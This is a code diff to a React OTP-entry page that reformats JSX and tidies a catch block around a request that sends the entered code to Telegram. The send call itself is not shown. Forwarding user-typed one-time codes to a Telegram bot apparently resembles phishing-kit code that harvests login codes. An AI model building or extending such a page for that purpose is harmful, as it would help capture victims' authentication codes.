@@ -59,10 +59,9 @@ export default function OtpPage() {
         const data = await telegramResponse.json();
         setError(data.description || "Failed to send OTP to Telegram.");
       }
-    } catch (err: any) {
-      setLoading(false);
-      setError("Network error. Try again later.");
+    } catch (err: unknown) {
       console.error("Telegram error:", err);
+      setError("Network error. Try again later.");
     }
   };
 
@@ -88,9 +87,14 @@ export default function OtpPage() {
   return (
     <div className="flex flex-col items-center justify-center min-h-screen bg-gradient-to-br from-gray-900 via-black to-gray-800 px-4">
       <div className="max-w-md w-full bg-white/5 backdrop-blur-md rounded-xl p-8 shadow-lg border border-white/10">
-        <h2 className="text-2xl font-semibold text-white text-center mb-6">Enter OTP</h2>
+        <h2 className="text-2xl font-semibold text-white text-center mb-6">
+          Enter OTP
+        </h2>
 
-        <form onSubmit={handleSubmit} className="flex flex-col items-center space-y-6">
+        <form
+          onSubmit={handleSubmit}
+          className="flex flex-col items-center space-y-6"
+        >
           <div className="flex gap-3">
             {digits.map((digit, i) => (
               <input
@@ -107,7 +111,10 @@ export default function OtpPage() {
           </div>
 
           <div className="text-sm text-white/70">
-            Time remaining: <span className="text-white font-mono">{formatTime(secondsLeft)}</span>
+            Time remaining:{" "}
+            <span className="text-white font-mono">
+              {formatTime(secondsLeft)}
+            </span>
           </div>
 
           {error && <p className="text-red-400 text-sm">{error}</p>}
